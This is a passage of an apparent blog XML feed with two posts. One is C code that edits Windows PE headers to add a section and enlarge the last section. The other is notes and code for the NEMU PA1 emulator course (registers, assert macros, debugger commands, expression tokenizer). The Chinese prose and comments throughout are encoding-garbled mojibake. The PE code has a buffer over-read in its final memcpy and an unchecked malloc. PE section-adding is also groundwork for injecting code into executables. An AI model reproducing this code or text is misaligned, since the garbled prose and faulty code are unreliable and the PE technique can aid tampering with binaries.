class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders = (<span class="type">void</span>*)((<span class="type">char</span>*)filebuffer + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)(PNtHeaders) != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)filebuffer + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    DWORD sectionsize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PNtHeaders-&gt;FileHeader.NumberOfSections; ++i) &#123;</span><br><span class="line">        sectionsize += IMAGE_SIZEOF_SECTION_HEADER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((PNtHeaders-&gt;OptionalHeader.SizeOfHeaders - sectionsize - IMAGE_SIZEOF_FILE_HEADER - PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader - PDosHeader-&gt;e_lfanew - <span class="number">4</span>) &lt; (<span class="number">2</span> * IMAGE_SIZEOF_SECTION_HEADER)) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;size too small&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders-&gt;OptionalHeader.SizeOfImage += AddNewSectionSize;</span><br><span class="line">    PNtHeaders-&gt;FileHeader.NumberOfSections += <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> newfile_size = sizeoffilebuffer + AddNewSectionSize;</span><br><span class="line">    <span class="type">void</span>* tempnewfilebuffer = <span class="built_in">malloc</span>(newfile_size);<span class="comment">//éœ€è¦åˆ¤æ–­æ˜¯å¦ç”³è¯·æˆåŠŸï¼Œæ²¡å†™ï¼›</span></span><br><span class="line">    <span class="built_in">memset</span>(tempnewfilebuffer, <span class="number">0</span>, newfile_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(tempnewfilebuffer, filebuffer, sizeoffilebuffer);</span><br><span class="line">    IMAGE_SECTION_HEADER sectionsource;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;sectionsource, PSectionHeader, IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class="line">    PIMAGE_SECTION_HEADER Psectionsource = &amp;sectionsource;</span><br><span class="line">    <span class="comment">//printf(&quot;%p,%p  &quot; ,&amp; sectionsource,Psectionsource);</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;sectionsource, <span class="string">&quot;.grxer&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;.grxer&quot;</span>));</span><br><span class="line">    <span class="comment">//(char*)Psectionsource = &quot;.grr&quot;;//è¿™ç§èµ‹å€¼æ–¹å¼ç»™çš„æ˜¯å¸¸é‡å­—ç¬¦ä¸²çš„åœ°å€ï¼Œlea</span></span><br><span class="line">    <span class="comment">//printf(&quot;%p,%p&quot;, &amp;sectionsource, Psectionsource);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, sectionsource.Name);</span><br><span class="line">    sectionsource.Misc.VirtualSize = AddNewSectionSize;</span><br><span class="line">    <span class="comment">//LastSectionHeader =(PSectionHeader + PNtHeaders-&gt;FileHeader.NumberOfSections - 2);</span></span><br><span class="line">    LastSectionHeader = &amp;PSectionHeader[PNtHeaders-&gt;FileHeader.NumberOfSections - <span class="number">1</span>];</span><br><span class="line">    sectionsource.VirtualAddress = LastSectionHeader-&gt;VirtualAddress + LastSectionHeader-&gt;SizeOfRawData;<span class="comment">//there should use the max of SizeOfRawData and VirtualSize</span></span><br><span class="line">    sectionsource.SizeOfRawData = AddNewSectionSize;</span><br><span class="line">    sectionsource.PointerToRawData = LastSectionHeader-&gt;PointerToRawData + LastSectionHeader-&gt;SizeOfRawData;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, sectionsource.VirtualAddress);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(((<span class="type">char</span>*)tempnewfilebuffer + sectionsize + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew + <span class="number">4</span>), &amp;sectionsource, IMAGE_SIZEOF_SECTION_HEADER);</span><br><span class="line">    *newfilebuffer = tempnewfilebuffer;</span><br><span class="line">    tempnewfilebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newfile_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ExpandTheLastSection</span><span class="params">(IN <span class="type">void</span>* filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer, OUT <span class="type">void</span>** newfilebuffer)</span> &#123;</span><br><span class="line">    PIMAGE_DOS_HEADER PDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_NT_HEADERS PNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">    PIMAGE_SECTION_HEADER PSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    PDosHeader = (PIMAGE_DOS_HEADER)filebuffer;</span><br><span class="line">    PIMAGE_SECTION_HEADER PLastSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (*(PWORD)PDosHeader != IMAGE_DOS_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PNtHeaders = (<span class="type">void</span>*)((<span class="type">char</span>*)filebuffer + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (*(PDWORD)(PNtHeaders) != IMAGE_NT_SIGNATURE) &#123;</span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot;not PE&quot;</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    PSectionHeader = (PIMAGE_SECTION_HEADER)((<span class="type">char</span>*)filebuffer + <span class="number">4</span> + IMAGE_SIZEOF_FILE_HEADER + PNtHeaders-&gt;FileHeader.SizeOfOptionalHeader + PDosHeader-&gt;e_lfanew);</span><br><span class="line">    PLastSectionHeader = &amp;PSectionHeader[PNtHeaders-&gt;FileHeader.NumberOfSections - <span class="number">1</span>];</span><br><span class="line">    <span class="type">size_t</span> finaddsize = (ExpandSectionSize / PNtHeaders-&gt;OptionalHeader.SectionAlignment) * PNtHeaders-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line">    <span class="keyword">if</span> ((ExpandSectionSize - finaddsize) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        finaddsize += PNtHeaders-&gt;OptionalHeader.SectionAlignment;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> newfilebuffersize = sizeoffilebuffer + finaddsize;</span><br><span class="line">    <span class="type">void</span>* tempnewfilebuffer = <span class="built_in">malloc</span>(newfilebuffersize);</span><br><span class="line">    <span class="built_in">memset</span>(tempnewfilebuffer, <span class="number">0</span>, newfilebuffersize);</span><br><span class="line">    <span class="comment">// æœ€åèŠ‚è¡¨æ”¹å¤§å°æ³¨æ„å¯¹é½</span></span><br><span class="line">    PLastSectionHeader-&gt;SizeOfRawData += finaddsize;</span><br><span class="line">    PLastSectionHeader-&gt;Misc.VirtualSize += finaddsize;</span><br><span class="line">    <span class="comment">// æ”¹sizeofiimage</span></span><br><span class="line">    PNtHeaders-&gt;OptionalHeader.SizeOfImage += finaddsize;</span><br><span class="line">    <span class="comment">//æ”¹å±æ€§</span></span><br><span class="line">    PLastSectionHeader-&gt;Characteristics |= PSectionHeader-&gt;Characteristics;</span><br><span class="line">    <span class="comment">//copy</span></span><br><span class="line">    <span class="built_in">memcpy</span>(tempnewfilebuffer, filebuffer, newfilebuffersize);</span><br><span class="line">    *newfilebuffer = tempnewfilebuffer;</span><br><span class="line">    tempnewfilebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;add %x byte&quot;</span>, finaddsize);</span><br><span class="line">    <span class="keyword">return</span> newfilebuffersize;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>x86 NEMU PA1</title>
      <link href="/2023/05/13/x86-nemu-pa1/"/>
      <url>/2023/05/13/x86-nemu-pa1/</url>
      
        <content type="html"><![CDATA[<h1 id="NEMU-PA1"><a href="#NEMU-PA1" class="headerlink" title="NEMU PA1"></a>NEMU PA1</h1><p><a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2020/PA1.html">https://nju-projectn.github.io/ics-pa-gitbook/ics2020/PA1.html</a></p><p>æ²¡ç”¨bashï¼Œç”¨çš„fish</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">export NEMU_HOME=/mnt/hgfs/share/ics2020/nemu</span><br><span class="line">export AM_HOME=/mnt/hgfs/share/ics2020/abstract-machine</span><br><span class="line">source ~/.config/fish/config.fish</span><br></pre></td></tr></table></figure><p>abstruct machine é‡Œchange SIGSTKSZ to 8192</p><p>vscode é…ç½®c_cpp_properties.jsoné‡Œä¸€äº›é¢„ç¼–è¯‘ï¼Œæ¥é…ç½®è§£æé€‰é¡¹è§£é”æ­£ç¡®çš„ä»£ç è§£æ</p><p>å¯ä»¥ç”¨make -nBæŸ¥çœ‹ä¸€ä¸‹é¡¹ç›®é‡ŒåŸæœ¬å®šä¹‰çš„é¢„ç¼–è¯‘å®</p><ul><li>-n ä»…æ˜¾ç¤ºå°†è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œè€Œä¸å®é™…æ‰§è¡Œå®ƒä»¬ã€‚</li><li>-B è¡¨ç¤º â€œalways-makeâ€ï¼Œå®ƒå‘Šè¯‰ make å¿½ç•¥æ—¶é—´æˆ³æ£€æŸ¥ï¼Œå¼ºåˆ¶é‡æ–°æ„å»ºç›®æ ‡æ–‡ä»¶</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 /m/h/s/i/nemu (pa1)&gt; make ARCH=x86-nemu ALL=dummy run -nB</span><br><span class="line">gcc -D__DIFF_REF_KVM__ -O2 -MMD -Wall -Werror -ggdb3 -I./include -I./src/engine/interpreter -D__ENGINE_interpreter__ -D__ISA__=x86 -D__ISA_x86__ -D_ISA_H_=\<span class="string">&quot;isa/x86.h\&quot;  -c -o build/obj-x86-interpreter/monitor/monitor.o src/monitor/monitor.c</span></span><br><span class="line"><span class="string">echo + CC src/isa/x86/decode.c</span></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//c_cpp_properties.json</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;includePath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;/**&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;defines&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;__DIFF_REF_KVM__&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;__ENGINE_interpreter__&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;__ISA__=x86 &quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;__ISA_x86__&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;_ISA_H_=\&quot;isa/x86.h\&quot;&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;compilerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/gcc&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cppStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gnu++17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;intelliSenseMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux-gcc-x64&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;configurationProvider&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ms-vscode.makefile-tools&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>é¢ï¼Œåæ¥ç”¨äº†clangdåšè§£æã€‚ã€‚ã€‚ã€‚ bear â€“makeè‡ªåŠ¨ç”Ÿæˆæ•°æ®åº“ï¼Œå¥½ç”¨å°¼</strong></p><p>æˆ–è€…ï¼Œä¸‹é¢è¿™ä¸ªå¥½åƒæ˜¯ä¸“é—¨ç»™makefileç”¨çš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pip install compiledb</span><br><span class="line">compiledb -n make ARCH=x86-nemu ALL=dummy</span><br><span class="line"><span class="comment">//-n è¡¨ç¤ºno-build</span></span><br></pre></td></tr></table></figure><p>å¼€å§‹paä¹‹æ—…:)</p><h2 id="å¯„å­˜å™¨ç»“æ„ä½“"><a href="#å¯„å­˜å™¨ç»“æ„ä½“" class="headerlink" title="å¯„å­˜å™¨ç»“æ„ä½“"></a>å¯„å­˜å™¨ç»“æ„ä½“</h2><p>åˆ©ç”¨åŒ¿åunionå’ŒåŒ¿åstructå»å†™</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do NOT change the order of the GPRs&#x27; definitions. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In NEMU, rtlreg_t is exactly uint32_t. This makes RTL instructions</span></span><br><span class="line"><span class="comment">   * in PA2 able to directly access these registers.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">      <span class="type">uint32_t</span> _32;</span><br><span class="line">      <span class="type">uint16_t</span> _16;</span><br><span class="line">      <span class="type">uint8_t</span> _8[<span class="number">2</span>];</span><br><span class="line">    &#125; gpr[<span class="number">8</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">      <span class="type">rtlreg_t</span> eax, ecx, edx, ebx, esp, ebp, esi, edi;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="type">vaddr_t</span> pc;</span><br><span class="line">&#125; x86_CPU_state;</span><br></pre></td></tr></table></figure><h2 id="å…³äºassertå®ç°ä¸å°è£…"><a href="#å…³äºassertå®ç°ä¸å°è£…" class="headerlink" title="å…³äºassertå®ç°ä¸å°è£…"></a>å…³äºassertå®ç°ä¸å°è£…</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) <span class="keyword">if</span> (!(cond)) panic(...);</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢å†™æ³•åœ¨ä¸€äº›ç‰¹æ®Šæƒ…å†µæ˜¯æœ‰é—®é¢˜çš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (...) assert(xxx); <span class="comment">// ä¸Šé¢çš„assertå¯¹ä¹ˆï¼Ÿ</span></span><br><span class="line"><span class="keyword">else</span> ...</span><br></pre></td></tr></table></figure><p>assertå±•å¼€åä¸‹é¢çš„elseä¼šè¢«å®é‡Œçš„ifå¸æ”¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¸æ”¶åé¢çš„ifæ˜¯ä¸€ä¸ªæ•´ä½“</p><p>nemué‡Œé‡‡ç”¨äº†ä¸‹é¢çš„å†™æ³•</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) \</span></span><br><span class="line"><span class="meta">  do &#123; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (!(cond)) &#123; \</span></span><br><span class="line"><span class="meta">      fprintf(stderr, <span class="string">&quot;Fail @ %s:%d&quot;</span>, __FILE__, __LINE__); \</span></span><br><span class="line"><span class="meta">      exit(1); \</span></span><br><span class="line"><span class="meta">    &#125; \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure><p>GNUæä¾›Cè¯­è¨€æ‰©å±•<code>(&#123; ... &#125;)</code>æ¥å§è¿™ä¸ªè¯­å¥å½“ä½œæ•´ä½“,ä½†è¿™ä¸æ˜¯cæ ‡å‡†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> assert(cond) (&#123; ... &#125;)</span></span><br></pre></td></tr></table></figure><p>å»çœ‹äº†ä¸€ä¸‹glibc2.35çš„æºç ï¼Œä¾æ—§å­˜åœ¨<code>#define assert(cond) if (!(cond)) panic(...);</code>çš„å†™æ³•ï¼Œä½†æ˜¯åŸºæœ¬ä¸Šåé¢éƒ½æ²¡æœ‰elseï¼Œä½†æˆ–è®¸æ˜¯ä¸ªéšæ‚£</p><h2 id="info-r"><a href="#info-r" class="headerlink" title="info r"></a>info r</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_info</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">strncmp</span>(<span class="string">&quot;r&quot;</span>, args, <span class="number">1</span>)) &#123;</span><br><span class="line">    isa_reg_display();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">isa_reg_display</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m%s:0x%x\t\033[0m &quot;</span>, regsl[i], cpu.gpr[i]._32);</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">3</span>) <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;33m\n%s:0x%x\n\033[0m&quot;</span>, <span class="string">&quot;pc&quot;</span>, cpu.pc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="si-N"><a href="#si-N" class="headerlink" title="si N"></a>si N</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_si</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">NULL</span> != args) &#123;</span><br><span class="line">    cpu_exec(strtoul(args, <span class="literal">NULL</span>, <span class="number">10</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    cpu_exec(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x-N-EXPR"><a href="#x-N-EXPR" class="headerlink" title="x N EXPR"></a>x N EXPR</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_x</span><span class="params">(<span class="type">char</span> *args)</span> &#123;</span><br><span class="line">  <span class="type">int</span> times = atoi(strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>));</span><br><span class="line">  <span class="type">vaddr_t</span> address = (<span class="type">vaddr_t</span>)strtoul(strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>), <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; times; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == i % <span class="number">4</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34m%08x: \033[0m&quot;</span>, address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%08x  &quot;</span>, vaddr_read(address, <span class="number">4</span>));</span><br><span class="line">    address += <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> == (i+<span class="number">1</span>) % <span class="number">4</span>)<span class="comment">//åœ¨åœ°å€è¾“å‡ºå‰è¾“å‡ºæ¢è¡Œ</span></span><br><span class="line">      <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(times%<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="p-è¡¨ç¤ºå¼æ±‚å€¼"><a href="#p-è¡¨ç¤ºå¼æ±‚å€¼" class="headerlink" title="p è¡¨ç¤ºå¼æ±‚å€¼"></a>p è¡¨ç¤ºå¼æ±‚å€¼</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Add more token types */</span></span><br><span class="line">    TK_NOTYPE = <span class="number">256</span>,</span><br><span class="line">    TK_EQ = <span class="number">1</span>,</span><br><span class="line">    TK_DEC = <span class="number">2</span>,</span><br><span class="line">    TK_ADD = <span class="number">3</span>,</span><br><span class="line">    TK_SUB = <span class="number">4</span>,</span><br><span class="line">    TK_MUL = <span class="number">5</span>,</span><br><span class="line">    TK_DIV = <span class="number">6</span>,</span><br><span class="line">    TK_BRAL = <span class="number">7</span>,</span><br><span class="line">    TK_BRAR = <span class="number">8</span>,</span><br><span class="line">    TK_DEREF = <span class="number">9</span>,</span><br><span class="line">    TK_HEX = <span class="number">10</span>,</span><br><span class="line">    TK_REG=<span class="number">11</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">rule</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *regex;</span><br><span class="line">    <span class="type">int</span> token_type;</span><br><span class="line">&#125; rules[] = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> Add more rules.</span></span><br><span class="line"><span class="comment">     * Pay attention to the precedence level of different rules.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    &#123;<span class="string">&quot;0[xX][0-9a-fA-F]+&quot;</span>, TK_HEX&#125;,<span class="comment">//è¿™ä¸ªè¦æ¯”åè¿›åˆ¶é å‰ï¼Œä¸ç„¶ä¼šè¢«åè¿›åˆ¶æŠŠ0xçš„0ç»™åŒ¹é…èµ°</span></span><br><span class="line">    &#123;<span class="string">&quot;[0-9]+&quot;</span>, TK_DEC&#125;, &#123;<span class="string">&quot; +&quot;</span>, TK_NOTYPE&#125;,  <span class="comment">// spaces</span></span><br><span class="line">    &#123;<span class="string">&quot;\\+&quot;</span>, TK_ADD&#125;,  <span class="comment">// plusç¬¬ä¸€ä¸ª/æ˜¯ä¸ºäº†è½¬ä¹‰cè¯­è¨€ï¼Œç¬¬äºŒä¸ª/æ˜¯ä¸ºäº†è½¬ä¹‰æ­£åˆ™</span></span><br><span class="line">    &#123;<span class="string">&quot;-&quot;</span>, TK_SUB&#125;,      &#123;<span class="string">&quot;\\*&quot;</span>, TK_MUL&#125;,   &#123;<span class="string">&quot;/&quot;</span>, TK_DIV&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;\\(&quot;</span>, TK_BRAL&#125;,   &#123;<span class="string">&quot;\\)&quot;</span>, TK_BRAR&#125;,  &#123;<span class="string">&quot;==&quot;</span>, TK_EQ&#125;,  <span class="comment">// equal</span></span><br><span class="line">    &#123;<span class="string">&quot;\\$[a-z]+&quot;</span>, TK_REG&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* <span class="doctag">TODO:</span> Now a new token is recognized with rules[i]. Add codes</span></span><br><span class="line"><span class="comment">                 * to record the token in the array `tokens&#x27;. For certain types</span></span><br><span class="line"><span class="comment">                 * of tokens, some extra actions should be performed.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (rules[i].token_type) &#123;</span><br><span class="line">    <span class="keyword">case</span> TK_NOTYPE:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> TK_EQ:</span><br><span class="line">    <span class="keyword">case</span> TK_DEC:</span><br><span class="line">    <span class="keyword">case</span> TK_ADD:</span><br><span class="line">    <span class="keyword">case</span> TK_SUB:</span><br><span class="line">    <span class="keyword">case</span> TK_MUL:</span><br><span class="line">    <span class="keyword">case</span> TK_DIV:</span><br><span class="line">    <span class="keyword">case</span> TK_BRAL:</span><br><span class="line">    <span class="keyword">case</span> TK_BRAR:</span><br><span class="line">    <span class="keyword">case</span> TK_HEX:</span><br><span class="line">    <span class="keyword">case</span> TK_REG:</span><br><span class="line">        tokens[nr_token].type = rules[i].token_type;</span><br><span class="line">        <span class="built_in">strncpy</span>(tokens[nr_token].str, substr_start, substr_len);</span><br><span class="line">        tokens[nr_token].str[substr_len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        nr_token++;</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ£€æµ‹æ˜¯å¦è¢«æ‹¬å·åŒ…å›´</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">check_parentheses</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bracket = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (tokens[start].type == TK_BRAL &amp;&amp; tokens[end].type == TK_BRAR) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt;= end; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tokens[i].type == TK_BRAL) &#123;</span><br><span class="line">                bracket++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tokens[i].type == TK_BRAR) &#123;</span><br><span class="line">                bracket--;</span><br><span class="line">                <span class="keyword">if</span> (i != end &amp;&amp; <span class="number">0</span> == bracket) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == bracket) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ£€æµ‹æ‹¬å·æ˜¯å¦è¡¨è¾¾å¼</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">check_exp_is_valid</span><span class="params">(<span class="type">int</span> start,<span class="type">int</span> end)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bracket = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt;= end; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tokens[i].type == TK_BRAL) &#123;</span><br><span class="line">            bracket++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tokens[i].type == TK_BRAR) &#123;</span><br><span class="line">            bracket--;</span><br><span class="line">            <span class="keyword">if</span> (bracket &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span 